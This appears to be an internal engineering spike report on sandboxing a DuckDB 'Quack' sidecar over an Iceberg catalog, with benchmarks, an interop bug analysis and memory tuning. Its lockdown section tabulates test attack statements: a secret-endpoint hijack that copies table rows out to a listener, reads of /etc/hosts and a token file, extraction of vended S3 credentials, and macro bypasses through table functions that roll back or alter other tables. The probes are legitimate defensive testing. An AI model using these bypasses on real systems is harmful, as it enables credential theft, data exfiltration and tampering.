read/all.sh base_l_r1                              # 12 configs x (w0 + 3): read/run.sh series <gw|eng> <cfg> 3 <table> <flags>
read/run.sh series eng eng-full-arrow-m256 3 base_l_r1 -q full -sink arrow -threads 4 -memory-limit 256MiB   # likewise m512
read/summarize.py > results/task5/summary.md
# incremental
RB_CMD=inc read/run.sh series eng inc-engine-from-S0 3 inc_1793450601 -base <S0>
read/gwwrite.sh <table> APPEND|FULL_LOAD <rows>    # gateway-written snapshots
read/run.sh gw <cfg> r1 <table> -format parquet -sink discard -since <snapshot>   # (GW_SINCE=<id> also sets it in the gateway config)
measure/silo.py                                    # silo traffic counters (SILO_METRICS_PATH=minio/v2/metrics/cluster)
```
Raw: `results/task5/{<cfg>.jsonl,<cfg>.run.jsonl,summary.md,inc-ids.env,inc-gw-ids.env,inc-table.txt,gw-inc-table.txt,logs/}`.
Fixture tables left in the catalog: `raw.inc_1793450601`, `raw.rd_gw_1793453150`, `raw.interop_1793453243_{v2,v3}`.

## Quack and lockdown

Q6. Paths are relative to `spikes/duckdb-sidecar/`. Lakekeeper authn is disabled locally, so the bearer is
effectively project-wide `editor` (as in production); token validation and OpenFGA are not covered.

**Sidecar** (`cmd/quacksidecar`, a sibling of `cmd/sidecar` so the Quack posture is the whole program): in-memory
DuckDB 2.0.0 (duckdb-go v2.20000.0) → `INSTALL/LOAD iceberg, httpfs, quack` → `CREATE SECRET (TYPE ICEBERG)` →
writable `ATTACH … (TABLE_RESOLUTION 'eager', vended credentials)` → `DROP SECRET` → register `authz_log` (Go scalar
UDF that appends `{sid, query}` to `authz.jsonl` and returns the query) → `CREATE MACRO datuplet_authz(sid, q)` +
`SET GLOBAL quack_authorization_function = 'datuplet_authz'` → lockdown (autoinstall/autoload/community off,
`allow_unredacted_secrets=false`, `allowed_directories=[<shared dir>, <catalog URL prefix>, <storage prefix>]`,
`enable_external_access=false`, `lock_configuration=true` last) → `quack_serve('quack:127.0.0.1:58310', token =>
<per-run 32-hex token>, disable_ssl => true)` (works after the lock; bound to 127.0.0.1 only, `results/task6/pub/transcript.txt`).
The catalog is reached through an in-process tap (`127.0.0.1:58183`, logs method/path/status/Authorization-present
and stores the vended credential values it sees in the scratchpad only, for the leak grep).
With `enable_external_access=false` the catalog and storage URL prefixes **must** be in `allowed_directories`,
otherwise the first catalog call fails (`Permission Error: Cannot access "http://127.0.0.1:58183/catalog/v1/…" - file
system operations are disabled by configuration`, `results/task6/noallow/`).
The macro is one regular expression over the text (`bin/quacksidecar -print-macro -outputs ns.out`): no `;`, and either
`SELECT …`, `INSERT INTO lk.<ns>.<declared table>[\s(]…` (bare or double-quoted parts), `BEGIN TRANSACTION|COMMIT|ROLLBACK`,
or one of the two catalog-introspection texts the Quack client sends on ATTACH, verbatim
(`q6/quack-client-introspection.txt`, learned with `-authz log`, `results/task6/learn/authz.jsonl`; without them the
macro rejects the client's ATTACH, `results/task6/superseded/a-v1-macro-without-attach-allowlist/`).

**Probe** (`cmd/quackprobe`): 90 rows, each sent verbatim with `quack_query()` ("raw" channel) or as a client
statement against `ATTACH 'quack:…' AS q` ("attach" channel). Per row: the statement, outcome, error text, a fresh
loopback listener drained after the statement (drain barrier copied from `components/queryengine/lockdown_quack_test.go`),
and the before/after state of every target table read from Lakekeeper REST (exists, snapshots, total-records,
columns, `evil*` properties), not through the sidecar. Rows marked "capture" serve HTTP on that listener instead and
count requests. Each configuration gets fresh namespaces `q6<cfg>_<ts>_a` (declared output `out`, undeclared `other`)
and `…_b` (one victim table per destructive row, 2 seed snapshots each). After each run `q6/run.sh` greps every result
file for every vended value the tap captured, and redacts hits.

| Config | Authorization callback | Token | Storage allowlist |
|---|---|---|---|
| a | macro | correct | `s3://spk-bucket/` (the whole warehouse) |
| b | none (`quack_nop_authorization`) | correct | `s3://spk-bucket/` |
| c | macro | wrong | `s3://spk-bucket/` |
| e | none | correct | declared output's table location only |
| f | macro | correct | declared output's table location only |

| Q6 | Answer | One sentence | Evidence |
|---|---|---|---|
| (i) network outward | **Partly** | The lockdown refuses `ATTACH`/`CONNECT`/`quack_query` to other hosts, `read_csv('http://…')` and `s3://` URLs outside the allowlist (0 listener connections in every config), but (1) any `s3://` URL under the allowlisted storage prefix that no secret matches goes **unauthenticated to the public AWS endpoint** (`spk-bucket.s3.amazonaws.com`, HEAD/GET from a macro-admitted SELECT; PUT from `COPY` without the macro), (2) without the macro a component `CREATE SECRET (TYPE s3, ENDPOINT '<any host>', SCOPE 's3://spk-bucket/…')` redirects reads and `COPY` there — 5 requests incl. a `PUT` carrying table rows reached the listener, also with the narrowed allowlist (e), and (3) a macro-admitted `SELECT * FROM quack_serve('quack:0.0.0.0:58312', allow_other_hostname => true, token => '<attacker token>')` opens a second, non-loopback Quack listener (`*:58312 LISTEN`) with the component's own token and the sidecar's full catalog (every table of the warehouse). | `results/task6/{a,b,e}/matrix.jsonl` rows `read-s3-bucket-outside-wh`, `hijack-secret-*`, `bp-select-quack-serve-public`; `results/task6/aws-egress-repro.txt`; `results/task6/pub/transcript.txt` |
| (ii) run token / files outside the shared dir | **No** | `read_text` of the run-token file, `/etc/hosts`, `glob('/etc/*')`, `<shared>/../runtoken/token`, a symlink the component placed in the shared dir, `COPY … TO` outside the shared dir and `quack_generate_keys(directory := <outside>)` are all refused with `file system operations are disabled by configuration` in every config; reading a file in the shared dir works. (The allowlisted catalog URL prefix is readable: `read_text('http://127.0.0.1:58183/catalog/v1/…/tables/victim')` returned the load-table JSON — the tap shows those requests carry **no** `Authorization` header, so this only works because local authn is off.) | rows `read-runtoken`, `read-etc-hosts`, `glob-etc`, `read-shared*`, `copy-local-*`, `quack-generate-keys-outside`, `read-text-catalog-loadtable`; `results/task6/a/tap.jsonl` (`auth_header:false`) |
| (iii) vended credentials | **Yes** | `duckdb_secrets()` and `which_secret()` are empty, `duckdb_secrets(redact := false)` is refused, no `s3_*` setting holds a value, and no error text in 5 × 90 rows contains a vended value — but `SELECT … FROM iceberg_load_table_response('lk.<any ns>.<any table>')` is a plain SELECT, admitted by the macro, and returns `s3.access-key-id`, `s3.secret-access-key` and `s3.session-token` (the extracted key id and secret matched the tap's capture exactly, `LEAK {'s3.access-key-id': 1, 's3.secret-access-key': 1}`, redacted); the STS credentials are scoped to that table's prefix (list/put own prefix allowed; another table's prefix, bucket root and objects outside tables denied), yet any table's can be fetched, and with them the component **overwrote an existing data file of an undeclared table** (no catalog commit), which then fails to scan. | rows `load-table-response-flags`, `load-table-response-raw`; `results/task6/*/leakgrep.txt`; `results/task6/stsscope/transcript.txt` |
| (iv) write outside declared outputs | **Yes** (macro bypassed) | Real attempted writes: with the macro every direct `INSERT`/`DELETE`/`CREATE TABLE`/`CREATE SCHEMA`/`DROP`/`ALTER`/`CALL set_iceberg_table_properties` on undeclared tables in the same and another namespace was refused and left the table unchanged, but SELECT-shaped catalog writers pass: `SELECT * FROM iceberg_rollback_to_snapshot('lk.<other ns>.victim_rb', <first>)` **rolled the table back (total-records 2 → 1)**, `SELECT * FROM set_iceberg_table_properties(…)` set a property, and the admitted `INSERT INTO <declared> SELECT … FROM set_iceberg_table_properties('<other table>', …)` wrote both; without the macro (b) every write lands (rows, DROP, CREATE SCHEMA, ALTER); a storage allowlist narrowed to the output's location (e, f) blocks data writes to other tables at the FS layer but no metadata-only write. | rows `insert-*`, `delete-undeclared`, `create-*`, `drop-table`, `alter-table`, `set-props-call`, `bp-select-*`, `bp-insert-declared-from-writing-fn` with `before`/`after` in `results/task6/{a,b,e,f}/matrix.jsonl` |
| Callback sees enough for (iv)? | **No** | It receives `(sid, query)` where `query` is SQL **text**: the raw request text verbatim (comments, multi-statement text in one call), or for ATTACH clients the client's deparsed SQL (`BEGIN TRANSACTION`, `INSERT INTO lk.ns."out" (VALUES …)`, `INSERT INTO lk.ns."out" SELECT * FROM scan_data_from_quack_client('<uuid>', NULL::STRUCT(…), ordered := true)`, `DROP TABLE …;`, `COMMIT`, two introspection queries) — never a parsed or bound form; a SQL macro cannot parse it (`json_serialize_sql` → `Only SELECT statements can be serialized to json!` for INSERT and multi-statement text), so enforcing (iv) means re-implementing a parser plus a table-function allowlist that must be re-proven on every DuckDB bump. | `results/task6/a/authz.jsonl`, `results/task6/learn/authz.jsonl`, `results/task6/json_serialize_sql-probe.txt`, `results/task6/table-functions.csv` |

**Probe matrix** (36 of the 90 rows; all rows: `results/task6/matrix-summary.txt`, generated by `q6/summarize.py`).
Cells: `OK` = statement succeeded; `authz` = `Invalid Input Error: Authorization failed` (the macro); `authn` =
`Invalid Input Error: Authentication failed`; `fs` = `Permission Error: Cannot access … file system operations are disabled
by configuration`; `lock` = `Cannot change configuration option "…" - the configuration has been locked`; `ext` = `Loading
external extensions is disabled through configuration`; `404/403` = HTTP status of the storage request; then the catalog
effect measured from Lakekeeper REST. Listener connections were **0 in every row of every config** except the capture rows
marked **N req**.

| Row | Statement | a (macro) | b (no macro) | c (wrong token) | e (no macro, narrow storage) | f (macro, narrow storage) |
|---|---|---|---|---|---|---|
| attach-quack-out | `ATTACH 'quack:127.0.0.1:<l>' AS evil (TOKEN …)` | authz | fs | authn | fs | authz |
| attach-postgres-out | `ATTACH 'host=127.0.0.1 port=<l> …' AS pg (TYPE postgres)` | authz | ext | authn | ext | authz |
| connect-quack-out | `CONNECT 'quack:127.0.0.1:<l>'` | authz | `Could not find a Quack authentication token` | authn | same as b | authz |
| quack-query-out | `SELECT * FROM quack_query('quack:127.0.0.1:<l>', 'SELECT 1', …)` | fs | fs | authn | fs | fs |
| read-csv-http | `SELECT * FROM read_csv('http://127.0.0.1:<l>/x.csv')` | fs | fs | authn | fs | fs |
| read-s3-other-bucket | `read_text('s3://q6-other-bucket/x.txt')` | fs | fs | authn | fs | fs |
| read-s3-bucket-outside-wh | `read_text('s3://spk-bucket/q6-outside-warehouse/x.txt')` | 404 (AWS) | 404 (AWS) | authn | fs | fs |
| read-text-catalog-loadtable | `read_text('http://127.0.0.1:58183/catalog/v1/<p>/namespaces/<b>/tables/victim')` | OK, JSON with creds (authn off) | OK | authn | OK | OK |
| read-runtoken | `read_text('<task6>/<cfg>/runtoken/token')` | fs | fs | authn | fs | fs |
| read-etc-hosts | `read_text('/etc/hosts')` | fs | fs | authn | fs | fs |
| read-shared | `read_text('<shared>/hello.txt')` (must work) | OK | OK | authn | OK | OK |
| read-shared-dotdot | `read_text('<shared>/../runtoken/token')` | fs | fs | authn | fs | fs |
| read-shared-symlink | `read_text('<shared>/link-to-runtoken')` (symlink → token) | fs | fs | authn | fs | fs |
| duckdb-secrets | `SELECT … FROM duckdb_secrets()` | OK, 0 rows | OK, 0 rows | authn | OK, 0 rows | OK, 0 rows |
| duckdb-secrets-unredacted | `duckdb_secrets(redact := false)` | `Displaying unredacted secrets is disabled` | same | authn | same | same |
| s3-error-in-table-prefix | `read_parquet('<victim location>/data/q6-nope.parquet')` | 404, no key in text | 404, no key | authn | fs | fs |
| load-table-response-flags | `SELECT … FROM iceberg_load_table_response('lk.<b>.victim')` | **OK, session token + secret key present** | OK, same | authn | OK, same | OK, same |
| create-secret-s3 | `CREATE SECRET evil_s3 (TYPE s3, ENDPOINT '127.0.0.1:<l>', …)` | authz | OK | authn | OK | authz |
| hijack-secret-copy-exfil | `CREATE OR REPLACE SECRET hijack (… ENDPOINT '127.0.0.1:<l>', SCOPE 's3://spk-bucket/'); COPY (… FROM lk.<b>.victim) TO 's3://spk-bucket/q6-exfil.csv'` | authz | **5 req** (HEAD/GET/PUT, body `v\nexfiltrated-row`) | authn | fs (exfil inside the output prefix: **5 req**, row `…-outloc`) | authz |
| set-threads | `SET threads = 1` | authz | lock | authn | lock | authz |
| set-global-authz-nop | `SET GLOBAL quack_authorization_function = 'quack_nop_authorization'` | authz | lock | authn | lock | authz |
| reset-lock-configuration | `RESET lock_configuration` | authz | lock | authn | lock | authz |
| replace-authz-macro | `CREATE OR REPLACE MACRO datuplet_authz(sid, q) AS true` | authz | **OK** | authn | **OK** | authz |
| insert-declared | `INSERT INTO lk.<a>.out VALUES (1, 'ok')` (must work) | OK, rows +1 | OK | authn | OK | OK |
| insert-undeclared-same-ns | `INSERT INTO lk.<a>.other VALUES (99, 'evil')` | authz, unchanged | **OK, rows 2→3** | authn | fs, unchanged | authz |
| insert-undeclared-other-ns | `INSERT INTO lk.<b>.victim VALUES (99, 'evil')` | authz, unchanged | **OK, rows 2→3** | authn | fs, unchanged | authz |
| create-table | `CREATE TABLE lk.<a>.evil_new (a INTEGER)` | authz | **OK, created** | authn | **OK, created** | authz |
| drop-table | `DROP TABLE lk.<b>.victim_drop` | authz, exists | **OK, DROPPED** | authn | **OK, DROPPED** | authz |
| alter-table | `ALTER TABLE lk.<b>.victim_alter ADD COLUMN evil INTEGER` | authz | **OK, cols 2→3** | authn | **OK, cols 2→3** | authz |
| set-props-call | `CALL set_iceberg_table_properties('lk.<b>.victim_props', MAP {'evil': 'call'})` | authz | **OK, property set** | authn | **OK** | authz |
| copy-local-outside | `COPY (SELECT 1) TO '<task6>/<cfg>/outside/evil.csv'` | authz | fs | authn | fs | authz |
| copy-local-shared | `COPY (SELECT 1) TO '<shared>/copied.csv'` | authz | OK, file written | authn | OK | authz |
| copy-s3-bucket | `COPY (SELECT 1) TO 's3://spk-bucket/q6-evil/x.parquet'` | authz | 404 (PUT to AWS) | authn | fs | authz |
| copy-s3-table-prefix | `COPY (SELECT 1) TO '<victim location>/data/q6-evil.parquet'` | authz | 404 (AWS) | authn | fs | authz |
| bp-select-quack-serve-public | `SELECT * FROM quack_serve('quack:0.0.0.0:58312', allow_other_hostname => true, token => 'attacker-token-1234', …)` | **OK** (`*:58312 LISTEN`) | OK | authn | OK | OK |
| quack-stop-self | `SELECT * FROM quack_stop('quack:127.0.0.1:58310')` | **OK** (`Stopped listening`; next request refused) | OK | authn | OK | OK |

"AWS" = inferred: the locked sidecar cannot log HTTP, so the destination comes from the identical error reproduced on an
unlocked CLI with HTTP logging (`results/task6/aws-egress-repro.txt`: `https://spk-bucket.s3.amazonaws.com/…`, `Server:
AmazonS3`); `duckdb_secrets()`/`which_secret()` show no secret matches those URLs (the iceberg extension keeps the vended
credentials internal). Config c refused every row at authentication (`ATTACH` too), so the wrong token reaches nothing.

**Bypass attempts against the macro** (rows `bp-*`, `att-*`; a/f = macro):

| Attempt | Statement | Macro result | Effect |
|---|---|---|---|
| Comment prefix | `/* SELECT */ INSERT INTO lk.<b>.victim …` | refused | none (b: rows +1) |
| Line comment | `-- SELECT\nINSERT INTO lk.<b>.victim …` | refused | none |
| CTE wrapping | `WITH x AS (SELECT 96 AS id) INSERT INTO lk.<b>.victim_cte SELECT …` | refused (the macro admits no `WITH`) | none; b: rows +1 |
| INSERT inside a SELECT | `SELECT 1 UNION ALL (WITH x AS (…) INSERT INTO …)` | `Parser Error` (not expressible) | none |
| Quoted identifiers | `INSERT INTO "lk"."<b>"."victim_quoted" …` / `INSERT INTO "lk"."<a>"."out" …` / `lk.<a>."out" (id)` | refused / admitted / admitted (correct) | declared only |
| Name prefix | `INSERT INTO lk.<a>.out_evil …` | refused | none |
| Multiple statements | `SELECT 1; INSERT INTO lk.<b>.victim_multi …`, `INSERT INTO <declared> …; INSERT INTO <other> …` | refused (`;`) | none; b: **both statements run** (one callback for the whole text); e: the first INSERT committed, the second failed (no atomicity) |
| `quack_query_by_name` pass-through (attach client) | `SELECT * FROM quack_query_by_name('q', 'INSERT INTO lk.<b>.victim_att …')` | refused (server receives the inner INSERT text) | none |
| ATTACH client writes | `INSERT INTO q.lk.<b>.victim_att …`, `DROP TABLE q.lk.<b>.victim_att_drop`, `CREATE TABLE q.lk.<a>.att_new …` | refused | none; declared-output INSERTs via ATTACH (incl. client temp-table data via `scan_data_from_quack_client`) admitted |
| **SELECT-shaped catalog writer** | `SELECT * FROM iceberg_rollback_to_snapshot('lk.<b>.victim_rb', <first snapshot>)` | **admitted** | **victim_rb rolled back, total-records 2 → 1** (a, b, e, f) |
| **SELECT-shaped catalog writer** | `SELECT * FROM set_iceberg_table_properties('lk.<b>.victim_props_sel', MAP {'evil': 'select'})` | **admitted** | **property set** |
| **Writer inside an admitted INSERT** | `INSERT INTO lk.<a>.out SELECT 2, 'b7' FROM set_iceberg_table_properties('lk.<b>.victim_b7', …)` | **admitted** | **out +1 row and victim_b7 property set** |
| **Credential read** | `SELECT … FROM iceberg_load_table_response('lk.<b>.victim')` | **admitted** | vended key id + secret + session token returned |
| **New listener** | `SELECT * FROM quack_serve('quack:127.0.0.1:58311' / '0.0.0.0:58312', token => 'attacker-token-1234')` | **admitted** | second server, attacker token, same callback (`authz=datuplet_authz`), whole catalog |
| **Self-stop** | `SELECT * FROM quack_stop('quack:127.0.0.1:58310')` | **admitted** | sidecar stops serving (DoS on its own run) |
| Egress via SELECT | `INSERT INTO <declared> SELECT … FROM quack_query('quack:127.0.0.1:<l>', …)` | admitted | refused by `fs`, 0 connections |
| False positives | `SELECT 'a;b'` (a `;` in a literal), any `WITH …` read | refused | — |

So the macro could be bypassed: everything it refuses by statement shape is real, but DuckDB exposes catalog writes,
credential reads and listener control as **table functions callable from a SELECT** (`results/task6/table-functions.csv`:
`iceberg_rollback_to_snapshot`, `set_/remove_iceberg_table_properties`, `set_/remove_iceberg_schema_properties`,
`iceberg_rewrite_data_files`, `iceberg_load_table_response`, `iceberg_to_ducklake`, `quack_serve/stop/query/cancel`, …).
A text macro cannot see them inside an INSERT's source query or behind a future function name. `lock_configuration`
froze every `SET`/`RESET` (including `SET GLOBAL quack_authorization_function` and `RESET lock_configuration`) even
without the macro, but it does not stop `CREATE SECRET` or `CREATE OR REPLACE MACRO datuplet_authz … AS true` (b, e:
OK) — a macro-based callback is only as strong as its own refusal of DDL. A Go scalar UDF works as the callback
(`authz_log` was invoked on the callback's fresh connection), so a real parser + function allowlist in Go is possible,
but it is new security-critical code, not a DuckDB feature.

**Other observations.** Eager resolution plus a read-only macro still exposes **every table of the warehouse** to the
component for reading (`lk_tables` = 524-626 in `bp-new-server-reachable`, the whole warehouse at that time); the narrowed storage allowlist (e, f) also blocks
reading other tables' data (`att-select-other`: fs), which doubles as an input allowlist but needs the table locations
before the sidecar starts. Storage allowlisting cannot stop metadata-only writes because Lakekeeper writes the metadata
files itself. `iceberg_rewrite_data_files` on a 2-file victim rewrote 0 files (no snapshot), so its write effect is
untested. The setup hit `Cannot reconstruct table … iceberg_use_metadata_log is enabled, but the table metadata does not
contain a metadata-log` once on a fresh table (`results/task6/superseded/a-setupfail/setup.log`); setup now sets
`iceberg_use_metadata_log = false`.

**Commands** (from `spikes/duckdb-sidecar/`, fixture up):
```
CGO_ENABLED=1 go build -tags duckdb_arrow -o bin/quacksidecar ./cmd/quacksidecar
CGO_ENABLED=1 go build -tags duckdb_arrow -o bin/quackprobe ./cmd/quackprobe
ONLY=att-select-other,att-insert-declared,… q6/run.sh learn log right        # what ATTACH clients send
q6/run.sh a macro right -allow-exact q6/quack-client-introspection.txt
q6/run.sh b none right
q6/run.sh c macro wrong -allow-exact q6/quack-client-introspection.txt
ALLOW_EXTRA='http://127.0.0.1:58183/,<out-loc>' q6/run.sh e none right
ALLOW_EXTRA='http://127.0.0.1:58183/,<out-loc>' q6/run.sh f macro right -allow-exact q6/quack-client-introspection.txt
ONLY=read-shared,insert-declared ALLOW_EXTRA='http://127.0.0.1:1/unused' q6/run.sh noallow none right
q6/stsscope.sh                                                                 # what the leaked STS creds can do
q6/summarize.py results/task6 a b c e f > results/task6/matrix-summary.txt
```
Raw: `results/task6/<cfg>/{matrix.jsonl,authz.jsonl,tap.jsonl,sidecar.log,probe.stderr,leakgrep.txt,config.txt}` for
cfg a b c e f (final runs) and learn, noallow; `results/task6/{matrix-summary.txt,aws-egress-repro.txt,table-functions.csv,
json_serialize_sql-probe.txt}`, `results/task6/{pub,stsscope}/transcript.txt`; earlier iterations in `results/task6/superseded/`.
Fixture state left: namespaces `q6*_a`/`q6*_b` in warehouse `spk` (one table data file in `q6s_1793455602_b.victim`
deliberately overwritten), objects `s3://spk-bucket/q6-outside-warehouse/x.txt` and `<q6s victim location>/data/q6-sts-evil.txt`.

## Iceberg interop

**Finding.** Gateway (iceberg-go) cannot read DuckDB 2.0.0-written v2/v3 tables, but the table data is valid: PyIceberg 0.12.0 reads all of them. The deviation is on the **reader side (iceberg-go)**, not the DuckDB writer. The fix is already upstream in iceberg-go and is a dependency bump.

### What differs on disk (`manifest-dump.txt`)

| | gateway-written `raw.base_l_r1` | DuckDB-written `raw.inc_*`, `raw.interop_*_v2/_v3` |
|---|---|---|
| `metadata.json` format-version | 2 | 2 (v3 table: 3) |
| **manifest-list** Avro file metadata | `format-version=2`, `snapshot-id`, `sequence-number`, `parent-snapshot-id` | **none** (only `avro.codec` + `avro.schema`) |
| manifest-list entry fields | full v2 schema incl. `content`, `sequence_number`, `min_sequence_number` (field-ids 517/515/516), `key_metadata` | same v2 field-ids 500-518 present (v3 adds `first_row_id` 520), values correct (`sequence_number` 1..4, delete manifest `content=1`), no `key_metadata` |
| **manifest** Avro file metadata | `format-version=2`, `content=data`, `partition-spec`, `partition-spec-id`, `schema`, `schema-id` | identical key set, `format-version` = 2 / 3, `content` = data / deletes |

So DuckDB writes a manifest list whose Avro header carries no `format-version` key, with the version expressed only through the embedded writer schema (field-ids). The manifests themselves carry the key correctly.

### Exact iceberg-go check (module `v0.5.1-0.20260429200022-af2ddd4adf06`, the root go.mod pin)

1. `ReadManifestList` (`manifest.go:789`) picks the version from the optional manifest-list header key `format-version`; **if absent it assumes version 1** (and so uses the v1 reader schema).
2. `NewManifestReader` (`manifest.go:578`) then compares the manifest file's own `format-version` metadata (2) against `file.Version()` (the 1 assumed in step 1) and raises `manifest file's 'format-version' metadata indicates version 2, but entry from manifest list indicates version 1`.

The doc comment on `ReadManifestList` in this very version states the key is optional for manifest lists per spec and falls back to v1. It is a wrong fallback, not a spec requirement.

### Spec position

The spec requires `format-version` as Avro file metadata for **manifest files** ("Table format version number of the manifest as a string", required), but defines no required file-level keys for **manifest lists** (they must be valid Iceberg data files with the manifest_file schema). DuckDB is therefore spec-conformant; Java and PyIceberg never consult the key and resolve fields via the embedded writer schema field-ids. The issue is iceberg-go inferring version 1 from an optional key. (Note: Java, PyIceberg and iceberg-go all write the key, which is why the interop gap only shows against DuckDB.)

### Third reader: PyIceberg 0.12.0 (`pyiceberg.txt`, REST catalog, warehouse `<project>/spk`)

| table | result |
|---|---|
| `raw.inc_1793450601` (DuckDB, v2, 4 snapshots incl. a delete manifest) | OK, 80000 rows x 12 cols |
| `raw.interop_1793453243_v2` (DuckDB) | OK, 1000 rows |
| `raw.interop_1793453243_v3` (DuckDB, format v3) | OK, 1000 rows |
| `raw.base_l_r1` (gateway) | OK, 2000000 rows |

### Upstream status

- **iceberg-go**: issue #1760 / PR #1762 "fix(manifest): infer manifest list version from the embedded writer schema", merged to main 2026-08-12 (`c41efcc2`). It infers v2 from `content`/`sequence_number` field-ids and v3 from `first_row_id`, and the PR text names DuckDB's iceberg extension as the writer that omits the key. It is contained in **v0.7.0** (2026-10-01). The gateway's pin is 2026-04-29, 829 commits behind v0.7.0, so it predates the fix.
- **duckdb-iceberg**: feature request #1315 (write `format-version` in manifest-list metadata) was closed as "already fixed by #1169", but #1169 is "Implement MergeAppend strategy" and the manifest-list writer on `main` (checked 2026-10-31, `src/core/metadata/manifest/iceberg_manifest_list.cpp`) still sets no manifest-list key/value metadata. Treat a writer-side fix as not available; do not rely on it.

### Verification of the fix (scratch, not in repo)

- Reading the three DuckDB manifest lists with iceberg-go **v0.7.0** `ReadManifestList` returns correct versions (2/2/3), `content` (incl. `deletes` for the delete manifest) and sequence numbers.
- A scratch copy of the repo with only `go get github.com/apache/iceberg-go@v0.7.0` + `go mod tidy` builds (`go build ./pkg/... ./cmd/...`) and `go vet` / `go test` pass for `pkg/datagateway/...`, `pkg/icebergjob`, `pkg/catalogwriter`, `pkg/datupleticeio`. Caveats: the bump raises the `go` directive 1.25.7 -> 1.25.9 and upgrades grpc/protobuf/sqlite transitively; the other Go modules (`make tidy`, e2e, components) and the gateway end-to-end read against a DuckDB table were not exercised.

### Verdict and cheapest fix

- Violator: none on the writer; iceberg-go (pinned build) mis-handles an optional header key. Impact for other engines: Java/PyIceberg/DuckDB read DuckDB tables fine; only iceberg-go builds before 2026-08-12 (any Go tool on the old pin) fail, loudly here (older reads without the manifest-version guard could silently misread `content`/sequence numbers).
- Cheapest fix: **bump iceberg-go to >= v0.7.0** (via `make tidy`, plus the go 1.25.9 directive). No DuckDB setting exists to write the key. Fallbacks if the bump is unwanted: cherry-pick PR #1762's inference into a fork/`replace`, or patch the version fallback to take the version from table metadata's `format-version`. Waiting on duckdb-iceberg is not a plan.
- Spike consequence: a DuckDB-written table is not readable by the current gateway read path, so the "DuckDB sidecar writes, gateway/other Datuplet components read" topology depends on the iceberg-go bump (or on all readers being DuckDB/PyIceberg/Java).

## Read memory optimization

Task 5c. Can the engine's 1.09 GiB read RSS (`## Read semantics`) be cut? **Yes: to 143 MiB at the same or better wall,
below the gateway's Arrow path.** Three causes stack, and each has a fix. Paths are relative to `spikes/duckdb-sidecar/`.
Client `cmd/readbench2` (new; `cmd/readbench` is unchanged) opens the same `internal/engine` (DuckDB 2.0.0, iceberg+httpfs,
writable ATTACH, vended credentials, Lakekeeper direct) and reads `lk.raw.base_l_r1` (2 000 000 rows, 202.8 MB, ZSTD).
It runs under `read/run.sh` (with `RB_BIN=readbench2`, `TASK=task5c`), so it uses the same `time -l` RSS, silo counter
deltas and load average as Task 5. Each config is a warm-up plus 3 runs (median / min / max); knob rows are 1 run.
Load 1 m was 1.2-6.4 (per run in `*.run.jsonl`; the host was not idle).

**Diagnosis confirmed.** duckdb-go v2.20000.0 runs every query, including `Arrow.QueryContext` (`arrow.go:98` ->
`conn.QueryContext` -> `recordReaderFromRows`), through `statement.go:782 executeBound`. That is `PendingPrepared` +
`ExecutePending`, so the result is MATERIALIZED, and the package exposes no streaming option. Measured: the first Arrow
batch arrives after 0.86-1.72 s, when the process is already at 745-839 MiB (the whole result is built before batch 1).
Issuing the same calls through `duckdb-go-bindings` gives the same 1086 MiB. Switching only `PendingPrepared` to
`PendingPreparedStreaming` gives `ResultIsStreaming = true`, the first batch at 0.09-0.31 s, and 440-557 MiB.

**How the streaming reader is built.** `PendingPreparedStreaming` + `StreamFetchChunk` + `DataChunkToArrowArray`, which
yields 977 batches of 2 048 rows. The raw `duckdb_connection` comes from the engine's pinned `*duckdb.Conn` through
`unsafe`: its first field is `mapping.Connection = bindings.Connection`. Spike only: a sidecar would need an upstream
streaming option in duckdb-go or its own thin bindings layer.

### Results (L, 2 M rows; `results/task5c/summary.md`, `knobs.md`, `copy-single.md`)

| Config | Wall s (med / min / max) | RSS MiB | CPU s | silo MB sent | GETs | First batch s |
|---|---|---|---|---|---|---|
| 1. duckdb-go `Arrow.QueryContext` (Task 5 path), t4 | 1.43 / 1.36 / 1.63 | **1085** | 2.30 | 202.8 | 108 | 0.86-1.11 |
| 1b. bindings, materialized (`PendingPrepared`), t4 | 1.43 / 1.27 / 2.26 | 1086 | 2.31 | 202.8 | 108 | 0.89-1.72 |
| 2. streaming, t1 | 1.15 / 1.11 / 1.27 | 440 | 1.26 | 202.8 | 108 | 0.10-0.31 |
| 2. streaming, t2 | 1.15 / 1.14 / 2.13 | 557 | 2.15 | 202.8 | 108 | 0.13-1.10 |
| 2. streaming, t4 | 1.15 / 1.11 / 1.18 | 550 | 2.00 | 202.8 | 108 | 0.11-0.17 |
| **3. streaming + `enable_external_file_cache=false` + `read_ahead_depth=1`, t1** | **1.04 / 1.02 / 1.06** | **143** | 1.15 | 203.1 | 109 | 0.07 |
| 3. same, t4 | 1.07 / 1.04 / 1.10 | 144 | 1.95 | 203.1 | 109 | 0.05-0.06 |
| 4. same, t4, + Arrow IPC encode to a counting discard writer (590.3 MB IPC) | 1.13 / 0.96 / 1.13 | 144 | 1.93 | 203.1 | 109 | - |
| 6. same, t4, `SELECT id, amount` (2 M rows) | 0.36 / 0.36 / 0.37 | **89** | 0.65 | 31.7-40.9 | 26-29 | 0.06 |
| 5a. in-engine CTAS (ZSTD) `GROUP BY category` -> 20 rows, t4 defaults | 0.35 / 0.20 / 0.35 | 113 | 0.59 | 16.4 | 23 | - |
| 5a. same, best read knobs | 0.37 / 0.35 / 0.46 | 102 | 0.61 | 16.3 | 23 | - |
| 5b. in-engine full copy `INSERT INTO <fresh ZSTD table> SELECT *`, t4 defaults ¹ | 2.51 / 2.31 / 2.64 | **1438** | 6.92 | 202.8 (183.2 written) | 109 | - |
| 5b. same, best read knobs, t4 ¹ | 2.46 / 1.87 / 2.48 | 1345 | 5.78 | 203.1 | 110 | - |
| 5b. best read knobs, t2 / t1 (1 run each) ¹ | 3.77 / 3.38 | 850 / 469 | 3.76 / 3.01 | 203.1 | 110 | - |
| 5b. best read knobs + R3 `write.parquet.row-group-size=229376`, t2 / **t1** (1 run each) ¹ | 2.13 / **2.91** | 587 / **353** | 3.31 / 2.98 | 203.1 | 110 | - |
| 5b. best read knobs, t4, `memory_limit 256MiB` (1 run) | **FAIL** (Out of Memory, 255/256 MiB) | 452 | - | - | - | - |

¹ With `SET iceberg_use_metadata_log = false`, needed because of the failure below. Every copy that succeeded: 2 000 000
rows, 183.2 MB written. The R3-props t1 table was checked: 1 `append` snapshot, 2 files, ZSTD, 9 row groups of at most
229 376 rows (`results/task5c/verify-copy-r3props-t1.json`).

**Knob sweep** (setting names from `duckdb_settings()` in 2.0.0, `results/task5c/settings-io.json`: `async_threads`=32,
`read_ahead_depth`=-1 auto, `disable_parquet_prefetching`=false, `enable_external_file_cache`=true,
